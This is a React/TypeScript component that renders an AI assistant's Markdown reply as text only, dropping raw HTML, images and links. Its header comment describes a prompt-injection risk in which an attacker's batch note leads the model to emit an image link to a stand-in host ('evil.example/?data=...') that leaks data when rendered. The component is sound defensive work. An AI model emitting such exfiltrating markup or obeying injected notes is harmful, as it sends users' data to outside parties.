import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { Box } from '@chakra-ui/react'

/**
 * Renders the assistant's reply, which is Markdown (bold, lists, tables).
 *
 * The reply is untrusted: the model can echo text a user typed into a batch note, and an
 * attacker's note could make it emit `![x](https://evil.example/?data=...)`, where merely
 * *rendering* the image would send data away, or a link that looks like part of the app. So
 * this renders text only: raw HTML is dropped (react-markdown's default, plus `skipHtml`),
 * images show their alt text instead of loading, and links show their text without a link.
 */
const components: Components = {
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
  a: ({ children }) => <span>{children}</span>,
  table: ({ children }) => (
    <Box overflowX="auto" my={2}>
      <table>{children}</table>
    </Box>
  ),
}

export default function AssistantMarkdown({ children }: { children: string }) {
  return (
    <Box
      lineHeight="tall"
      css={{
        '& p': { marginBottom: '0.6em' },
        '& p:last-child, & ul:last-child, & ol:last-child': { marginBottom: 0 },
        '& ul, & ol': { paddingLeft: '1.4em', marginBottom: '0.6em' },
        '& table': { borderCollapse: 'collapse', fontSize: '0.9em' },
        '& th, & td': { border: '1px solid var(--chakra-colors-border)', padding: '4px 8px' },
        '& th': { textAlign: 'left', fontWeight: 600 },
      }}
    >
      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={components}>
        {children}
      </ReactMarkdown>
    </Box>
  )
}
